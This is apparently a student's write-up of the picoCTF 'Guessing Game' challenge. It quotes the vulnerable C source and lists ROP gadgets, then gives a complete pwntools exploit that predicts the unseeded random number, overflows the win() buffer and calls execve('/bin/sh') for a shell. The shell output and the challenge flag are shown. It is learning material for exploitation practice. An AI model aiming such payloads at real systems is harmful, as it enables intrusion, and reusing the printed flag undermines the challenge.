# Writeup: Guessing Game

## Introduction

This challenge gives us some source code so we can look at it to give us some ideas on where to start. 

```
    int do_stuff() {
            long ans = get_random();
            ans = increment(ans);
            int res = 0;

            printf("What number would you like to guess?\n");
            char guess[BUFSIZE];
            fgets(guess, BUFSIZE, stdin);

            long g = atol(guess);
            if (!g) {
                    printf("That's not a valid number!\n");
            } else {
                    if (g == ans) {
                            printf("Congrats! You win! Your prize is this print statement!\n\n");
                            res = 1;
                    } else {
                            printf("Nope!\n\n");
                    }
            }
            return res;
    }

    void win() {
            char winner[BUFSIZE];
            printf("New winner!\nName? ");
            fgets(winner, 360, stdin);
            printf("Congrats %s\n\n", winner);
    }

    int main(int argc, char **argv){
            setvbuf(stdout, NULL, _IONBF, 0);
            // Set the gid to the effective gid
            // this prevents /bin/sh from dropping the privileges
            gid_t gid = getegid();
            setresgid(gid, gid, gid);

            int res;

            printf("Welcome to my guessing game!\n\n");

            while (1) {
                    res = do_stuff();
                    if (res) {
                            win();
                    }
            }

            return 0;
    }
```

After looking over the code I can see that the only place where there is a chance at a buffer overflow is in the win function. The problem is that we can't get to the win function without guessing the random number. The good news is that this shouldn't be a problem because this code does not use a seed so no matter what the random number does not change between calls. This means we can call the rand function in our own script to get the correct random value every time. Now that we have access to the win function we can begin writing our ROP chain. To do this I will be attempting to call the system function and passing in "/bin/sh" so that we can get a shell and obtain the flag. The system call number for systems equivalent is 59 which needs to be passed into rax, and the address of the string needs to be passed into rdi while rsi, and rdx can be passed junk (0). The only thing left to do is to figure out how to get an address for the string "/bin/sh" when it does not exist in the binary (I ran strings -t x ./vuln and nothing came up). My idea is to write the string "/bin/sh" to the bss address which we can find using pwn tools and some ROP gadgets. Using ROPgadget I was able to find all of the necessary gadgets which I have listed below.

```
    0x00000000004006a6 : pop rdi ; ret
    0x00000000004005af : pop rax ; ret
    0x0000000000410b93 : pop rsi : ret
    0x0000000000410602 : pop rdx ; ret
    0x00000000004360d3 : mov qword ptr [rdi], rdx ; ret
    0x000000000040138c : syscall
```

The pop rdi gadget is so that we can pass the address of the string to the system call and so that we can put the address of the bss section in it so we can move the string into that memory location which is what the mov qword ptr [rdi], rdx gadget is for. The pop rax gadget is to pass the system call number to the system function and the pop rdx gadget is so we can pass the strin go the rdx register so that we can write the string to memory at the bss section and it is also used so we can zero it out before we make the system call along with the rsi regist which we will use the pop rsi gadget, finaly the syscall instruction is to call the system function after we have passed in all of the correct arguments to the appropriate registers. 

## Results

Now that we have everything laid out we can write the script.

```
    from pwn import *
    from ctypes import CDLL

    p = remote('shape-facility.picoctf.net', 50780)
    e = ELF('./vuln')
    libc = CDLL('libc.so.6')

    bss = e.bss()

    string = "/bin/sh\x00"
    POP_RDI = 0x00000000004006a6
    POP_RAX = 0x00000000004005af
    POP_RSI = 0x0000000000410b93
    POP_RDX = 0x0000000000410602
    MOV = 0x00000000004360d3 # mov qword ptr [rdi], rdx ; ret
    SYSCALL = 0x000000000040138c
    systemcall_num = 59
    address = ""
    padding = b'A' * 120
    value = libc.rand() % 100
    value += 1
    p.recvuntil(b'?\n')
    p.sendline(str(value).encode())
    p.recvuntil(b'? ')
    payload = padding + p64(POP_RDI) + p64(bss) + p64(POP_RDX) + string.encode() + p64(MOV) + p64(POP_RAX) + p64(59) + p64(POP_RSI) + p64(0) + p64(POP_RDX) + p64(0) + p64(SYSCALL)
    p.sendline(payload)
    p.interactive()
```

We can now run the script.

```
    [+] Opening connection to shape-facility.picoctf.net on port 50780: Done
    [*] '/mnt/c/Users/18506/Desktop/CTF/Guessing Game/vuln'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    [*] Switching to interactive mode
    Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa6\x06@

    $ cat flag.txt
    picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_476d756f24c7952d}
    [*] Got EOF while reading in interactive
    $
    [*] Closed connection to shape-facility.picoctf.net port 50780
    [*] Got EOF while sending in interactive
```

And we now finally have the flag!

`picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_476d756f24c7952d}`
